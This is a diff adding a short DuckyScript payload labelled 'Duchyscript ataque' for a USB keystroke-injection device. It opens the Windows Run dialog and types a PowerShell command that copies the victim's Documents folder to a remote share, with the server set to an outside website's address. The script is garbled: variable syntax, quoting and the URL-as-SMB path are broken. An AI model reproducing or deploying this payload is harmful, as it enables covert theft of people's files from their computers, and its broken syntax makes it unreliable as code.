@@ -1,0 +1,20 @@
+
+
+Duchyscript ataque
+
+documents usb
+
+
+REM Windows
+ATTACKMODE HID
+DELAY 2000
+DEFINE SMB_SERVER https://www.cbr.ru/eng/
+DEFINE SMB_SHARE sharedfolder
+GUI r
+DELAY 100
+STRING powershell "cp -r USERPROFILE\Documents\*\\
+STRING SMB_SERVER
+STRING \
+STRING SMB_SHARE
+STRING "
+ENTER
